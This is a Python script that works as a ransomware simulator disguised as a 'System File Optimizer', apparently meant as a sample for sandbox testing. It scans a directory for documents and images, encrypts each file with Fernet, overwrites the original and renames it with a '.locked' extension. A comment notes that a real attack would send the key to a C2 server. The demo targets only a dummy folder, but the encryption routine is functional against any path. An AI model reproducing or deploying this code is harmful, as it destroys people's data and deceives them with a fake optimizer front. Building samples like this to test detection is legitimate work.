import os
import time
from cryptography.fernet import Fernet

# 1. GENERATE DECEPTION KEY
# In a real attack, this key would be sent to a C2 server.
def initialize_engine():
    print("[+] Initializing Encryption Engine...")
    key = Fernet.generate_key()
    with open("unlock_key.txt", "wb") as key_file:
        key_file.write(key)
    return Fernet(key)

# 2. RECURSIVE FILE DISCOVERY
# This mimics the 'Trapping' behavior of ransomware.
def discover_target_files(directory):
    print(f"[*] Scanning directory: {directory}")
    target_extensions = ('.txt', '.pdf', '.docx', '.jpg', '.png')
    targets = []
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(target_extensions) and not file.startswith('.'):
                targets.append(os.path.join(root, file))
    return targets

# 3. ENCRYPTION (The High-Risk Behavior)
def detonate_payload(targets, engine):
    print(f"[!] Found {len(targets)} targets. Starting 'optimization'...")
    for file_path in targets:
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            
            # Encrypting the data
            encrypted_data = engine.encrypt(data)
            
            # Overwriting the original file with encrypted content
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
            
            # Renaming the file to a custom extension (common ransomware tactic)
            os.rename(file_path, file_path + ".locked")
            print(f"[*] Processed: {os.path.basename(file_path)}")
        except Exception as e:
            print(f"[-] Error processing {file_path}: {e}")

if __name__ == "__main__":
    print("=== SYSTEM FILE OPTIMIZER v2.0 ===")
    
    # Create a dummy folder for the sandbox to "attack"
    os.makedirs("test_data", exist_ok=True)
    with open("test_data/secret_notes.txt", "w") as f:
        f.write("This is highly sensitive company information.")
    
    engine = initialize_engine()
    targets = discover_target_files("./test_data")
    
    # Give the sandbox a moment to 'watch' the scan
    time.sleep(2) 
    
    detonate_payload(targets, engine)
    print("=== ALL FILES OPTIMIZED. RESTART SYSTEM TO APPLY CHANGES. ===")
